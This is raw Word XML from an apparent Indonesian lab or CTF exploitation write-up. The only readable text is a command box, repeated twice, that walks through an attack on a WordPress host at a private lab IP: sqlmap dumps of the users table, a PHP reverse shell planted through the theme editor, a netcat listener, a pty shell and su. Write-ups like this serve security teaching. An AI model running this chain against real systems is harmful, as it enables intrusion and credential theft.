      <w:r w:rsidRPr="0054223F">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251730944" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="07A325BB" wp14:editId="4BDB83E7">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-125730</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>4155440</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="6280150" cy="2809240"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21385"/>
                <wp:lineTo x="21556" y="21385"/>
                <wp:lineTo x="21556" y="0"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapTight>
            <wp:docPr id="8962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7876">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251729920" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="45B9A260" wp14:editId="6DFADC1F">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-125730</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>0</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="6280150" cy="4044950"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21464"/>
                <wp:lineTo x="21556" y="21464"/>
                <wp:lineTo x="21556" y="0"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapTight>
            <wp:docPr id="18305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0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AF3C" w14:textId="4818411D" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="15B85D49" w14:textId="4DEA045E" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="034B39F7" w14:textId="664B7B45" w:rsidR="000A6C48" w:rsidRDefault="00716719" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AB734B">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251731968" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="78C4E5AC" wp14:editId="3F600B76">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>131445</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>2540</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5734050" cy="3957320"/>
            <wp:effectExtent l="0" t="0" r="0" b="5080"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21524"/>
                <wp:lineTo x="21528" y="21524"/>
                <wp:lineTo x="21528" y="0"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapTight>
            <wp:docPr id="61880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7A4CF" w14:textId="00526B0F" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63FB61C3" w14:textId="718845CF" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E23175E" w14:textId="3B460D74" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B73FACF" w14:textId="563F9DD8" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52408CB7" w14:textId="017B1F9C" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="255BDC1D" w14:textId="605EED8D" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47F05EF2" w14:textId="6D345B7C" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="575E2C94" w14:textId="317C5C13" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21AF70CE" w14:textId="592D694A" w:rsidR="000A6C48" w:rsidRDefault="00AC5A14" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EE6E83">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251732992" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3E2D1BCB" wp14:editId="62A47FD6">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-1905</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>2540</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="6280150" cy="3163570"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21461"/>
                <wp:lineTo x="21556" y="21461"/>
                <wp:lineTo x="21556" y="0"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapTight>
            <wp:docPr id="6797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2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DF44C" w14:textId="71A13FEE" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FA98746" w14:textId="12535343" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18972A98" w14:textId="36C70B09" w:rsidR="000A6C48" w:rsidRPr="00F52D28" w:rsidRDefault="00FA4EA6" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID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6E248BB" wp14:editId="531DFE60">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-79363</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>4555310</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="6172835" cy="3549039"/>
                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapTight wrapText="bothSides">
                  <wp:wrapPolygon edited="0">
                    <wp:start x="0" y="0"/>
                    <wp:lineTo x="0" y="21449"/>
                    <wp:lineTo x="21531" y="21449"/>
                    <wp:lineTo x="21531" y="0"/>
                    <wp:lineTo x="0" y="0"/>
                  </wp:wrapPolygon>
                </wp:wrapTight>
                <wp:docPr id="76420597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835" cy="3549039"/>
                          <a:chOff x="0" y="0"/>
                          <a:chExt cx="6172835" cy="3549039"/>
                        </a:xfrm>
                      </wpg:grpSpPr>
                      <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                        <pic:nvPicPr>
                          <pic:cNvPr id="39343834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/>
                          <a:srcRect r="51315" b="68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835" cy="1125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317753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r="50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21434"/>
                            <a:ext cx="6172835" cy="2427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5FD32F" id="Group 5" o:spid="_x0000_s1026" style="position:absolute;margin-left:-6.25pt;margin-top:358.7pt;width:486.05pt;height:279.45pt;z-index:251738112" coordsize="61728,35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">
                <v:shape id="Picture 1" o:spid="_x0000_s1027" type="#_x0000_t75" style="position:absolute;width:61728;height:1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">
                  <v:imagedata r:id="rId24" o:title="" cropbottom="44902f" cropright="33630f"/>
                </v:shape>
                <v:shape id="Picture 1" o:spid="_x0000_s1028" type="#_x0000_t75" style="position:absolute;top:11214;width:61728;height:24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">
                  <v:imagedata r:id="rId25" o:title="" cropright="33132f"/>
                </v:shape>
                <w10:wrap type="tight"/>
              </v:group>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="009943A0" w:rsidRPr="007F2BB8">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251735040" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="0598B0F1" wp14:editId="036B1266">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-78105</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>2317115</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="6280150" cy="1688465"/>
            <wp:effectExtent l="0" t="0" r="6350" b="6985"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21446"/>
                <wp:lineTo x="21556" y="21446"/>
                <wp:lineTo x="21556" y="0"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapTight>
            <wp:docPr id="204446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6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DD9" w:rsidRPr="000C38A1">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251734016" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="52DC442A" wp14:editId="5BC92A01">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-1905</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>2540</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="6096851" cy="2219635"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21507"/>
                <wp:lineTo x="21530" y="21507"/>
                <wp:lineTo x="21530" y="0"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapTight>
            <wp:docPr id="59318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2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B47C4" w14:textId="5ACF0A32" w:rsidR="004E4349" w:rsidRDefault="00650907">
      <w:pPr>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Be</w:t>
      </w:r>
      <w:r w:rsidR="00F02CC7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>rikut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adalah</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> command yang </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F02CC7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>digunakan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untuk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eksploitasi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F02CC7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>kerentanan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="005738E1">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="40FDD1B5" wp14:editId="7552E2CE">
                <wp:extent cx="6170930" cy="4459856"/>
                <wp:effectExtent l="0" t="0" r="20320" b="17145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930" cy="4459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1DD83" w14:textId="0FA972A3" w:rsidR="00B70138" w:rsidRDefault="00B70138" w:rsidP="00B3095B">
                            <w:pPr>
                              <w:spacing w:line="240" w:lineRule="auto"/>
                            </w:pPr>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>sqlmap</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t xml:space="preserve"> -u "http://192.168.95.28/</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>login.php</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t xml:space="preserve">" --forms --batch </w:t>
                            </w:r>
                            <w:r>
                              <w:t>–</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>dbs</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                          </w:p>
                          <w:p w14:paraId="6DE056BD" w14:textId="459EECA9" w:rsidR="00B70138" w:rsidRDefault="00B70138" w:rsidP="00B3095B">
                            <w:pPr>
                              <w:spacing w:line="240" w:lineRule="auto"/>
                            </w:pPr>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>sqlmap</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t xml:space="preserve"> -u "http://192.168.95.28/</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>login.php</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t xml:space="preserve">" --forms --batch -D wordpress8080 </w:t>
                            </w:r>
                            <w:r>
                              <w:t>–</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>tables</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="68417462" w14:textId="11BC9150" w:rsidR="00B70138" w:rsidRDefault="00B70138" w:rsidP="00B3095B">
                            <w:pPr>
                              <w:spacing w:line="240" w:lineRule="auto"/>
                            </w:pPr>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>sqlmap</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t xml:space="preserve"> -u "http://192.168.95.28/</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>login.php</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>" --forms --batch -D wordpress8080 -T users --dump</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="0A161E0D" w14:textId="77777777" w:rsidR="00B70138" w:rsidRDefault="00B70138" w:rsidP="00B3095B">
                            <w:pPr>
                              <w:spacing w:line="240" w:lineRule="auto"/>
                            </w:pPr>
                            <w:hyperlink r:id="rId28" w:history="1">
                              <w:r w:rsidRPr="00B70138">
                                <w:rPr>
                                  <w:rStyle w:val="Hyperlink"/>
                                  <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                  <w:u w:val="none"/>
                                </w:rPr>
                                <w:t>http</w:t>
                              </w:r>
                              <w:r w:rsidRPr="00B70138">
                                <w:rPr>
                                  <w:rStyle w:val="Hyperlink"/>
                                  <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                  <w:u w:val="none"/>
                                </w:rPr>
                                <w:t>s</w:t>
                              </w:r>
                              <w:r w:rsidRPr="00B70138">
                                <w:rPr>
                                  <w:rStyle w:val="Hyperlink"/>
                                  <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                  <w:u w:val="none"/>
                                </w:rPr>
                                <w:t>://192.168.95.28/wordpress/wp-login.php</w:t>
                              </w:r>
                            </w:hyperlink>
                          </w:p>
                          <w:p w14:paraId="0C2B4245" w14:textId="77777777" w:rsidR="00B70138" w:rsidRDefault="00B70138" w:rsidP="00B3095B">
                            <w:pPr>
                              <w:spacing w:line="240" w:lineRule="auto"/>
                            </w:pPr>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>cat /usr/share/webshells/php/p</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>hp</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>-reverse-</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>shell.php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hyperlink r:id="rId29" w:history="1">
                              <w:r w:rsidRPr="00B70138">
                                <w:rPr>
                                  <w:rStyle w:val="Hyperlink"/>
                                  <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                                  <w:u w:val="none"/>
                                </w:rPr>
                                <w:t>https://192.168.95.28/wordpress/wp-admin/theme-editor.php?file=404.php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6542A551" w14:textId="77777777" w:rsidR="00FA4EA6" w:rsidRDefault="00B70138" w:rsidP="00B3095B">
                            <w:pPr>
                              <w:spacing w:line="240" w:lineRule="auto"/>
                            </w:pPr>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>nc</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t xml:space="preserve"> -</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t>lvnp</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00B70138">
                              <w:t xml:space="preserve"> 4444</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2CE38067" w14:textId="399828A2" w:rsidR="00FA4EA6" w:rsidRDefault="00FA4EA6" w:rsidP="00B3095B">
                            <w:pPr>
                              <w:spacing w:line="240" w:lineRule="auto"/>
                            </w:pPr>
                            <w:r w:rsidRPr="00FA4EA6">
                              <w:t>http://192.168.95.28/wordpress/wp-content/themes/TwentyTwelve/404.php</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5D62C690" w14:textId="77777777" w:rsidR="00FA4EA6" w:rsidRDefault="00FA4EA6" w:rsidP="00B3095B">
                            <w:pPr>
                              <w:spacing w:line="240" w:lineRule="auto"/>
                            </w:pPr>
                            <w:r w:rsidRPr="00FA4EA6">
                              <w:t xml:space="preserve">python -c 'import </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00FA4EA6">
                              <w:t>pty</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00FA4EA6">
                              <w:t xml:space="preserve">; </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00FA4EA6">
                              <w:t>pty.spawn</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00FA4EA6">
                              <w:t>("/bin/bash")'</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="24C05178" w14:textId="4BFB2DAE" w:rsidR="00FA4EA6" w:rsidRDefault="00FA4EA6" w:rsidP="00B3095B">
                            <w:pPr>
                              <w:spacing w:line="240" w:lineRule="auto"/>
                            </w:pPr>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00FA4EA6">
                              <w:t>su</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00FA4EA6">
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r>
                              <w:t>–</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7264A03A" w14:textId="3E25E227" w:rsidR="00B3095B" w:rsidRPr="00FA4EA6" w:rsidRDefault="00FA4EA6" w:rsidP="00B3095B">
                            <w:pPr>
                              <w:spacing w:line="240" w:lineRule="auto"/>
                            </w:pPr>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00FA4EA6">
                              <w:t>whoami</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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r w:rsidR="00650907">
                              <w:br/>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidR="00B3095B">
                              <w:t>whoami</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                          </w:p>
                          <w:p w14:paraId="57A425D8" w14:textId="08AB712B" w:rsidR="00D14E6A" w:rsidRDefault="00D14E6A" w:rsidP="005738E1"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FDD1B5" id="Text Box 27" o:spid="_x0000_s1028" type="#_x0000_t202" style="width:485.9pt;height:35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" fillcolor="white [3201]" strokeweight=".5pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="3F91DD83" w14:textId="0FA972A3" w:rsidR="00B70138" w:rsidRDefault="00B70138" w:rsidP="00B3095B">
                      <w:pPr>
                        <w:spacing w:line="240" w:lineRule="auto"/>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>sqlmap</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t xml:space="preserve"> -u "http://192.168.95.28/</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>login.php</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t xml:space="preserve">" --forms --batch </w:t>
                      </w:r>
                      <w:r>
                        <w:t>–</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>dbs</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                    </w:p>
                    <w:p w14:paraId="6DE056BD" w14:textId="459EECA9" w:rsidR="00B70138" w:rsidRDefault="00B70138" w:rsidP="00B3095B">
                      <w:pPr>
                        <w:spacing w:line="240" w:lineRule="auto"/>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>sqlmap</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t xml:space="preserve"> -u "http://192.168.95.28/</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>login.php</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t xml:space="preserve">" --forms --batch -D wordpress8080 </w:t>
                      </w:r>
                      <w:r>
                        <w:t>–</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>tables</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="68417462" w14:textId="11BC9150" w:rsidR="00B70138" w:rsidRDefault="00B70138" w:rsidP="00B3095B">
                      <w:pPr>
                        <w:spacing w:line="240" w:lineRule="auto"/>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>sqlmap</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t xml:space="preserve"> -u "http://192.168.95.28/</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>login.php</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>" --forms --batch -D wordpress8080 -T users --dump</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0A161E0D" w14:textId="77777777" w:rsidR="00B70138" w:rsidRDefault="00B70138" w:rsidP="00B3095B">
                      <w:pPr>
                        <w:spacing w:line="240" w:lineRule="auto"/>
                      </w:pPr>
                      <w:hyperlink r:id="rId30" w:history="1">
                        <w:r w:rsidRPr="00B70138">
                          <w:rPr>
                            <w:rStyle w:val="Hyperlink"/>
                            <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                            <w:u w:val="none"/>
                          </w:rPr>
                          <w:t>http</w:t>
                        </w:r>
                        <w:r w:rsidRPr="00B70138">
                          <w:rPr>
                            <w:rStyle w:val="Hyperlink"/>
                            <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                            <w:u w:val="none"/>
                          </w:rPr>
                          <w:t>s</w:t>
                        </w:r>
                        <w:r w:rsidRPr="00B70138">
                          <w:rPr>
                            <w:rStyle w:val="Hyperlink"/>
                            <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
                            <w:u w:val="none"/>
                          </w:rPr>
                          <w:t>://192.168.95.28/wordpress/wp-login.php</w:t>
                        </w:r>
                      </w:hyperlink>
                    </w:p>
                    <w:p w14:paraId="0C2B4245" w14:textId="77777777" w:rsidR="00B70138" w:rsidRDefault="00B70138" w:rsidP="00B3095B">
                      <w:pPr>
                        <w:spacing w:line="240" w:lineRule="auto"/>
                      </w:pPr>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>cat /usr/share/webshells/php/p</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>hp</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>-reverse-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00B70138">
                        <w:t>shell.php</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r>
                        <w:br/>
                      </w:r>
                      <w:r>
                        <w:br/>
                      </w:r>
                      <w:hyperlink r:id="rId31" w:history="1">
                        <w:r w:rsidRPr="00B70138">
                          <w:rPr>
                            <w:rStyle w:val="Hyperlink"/>
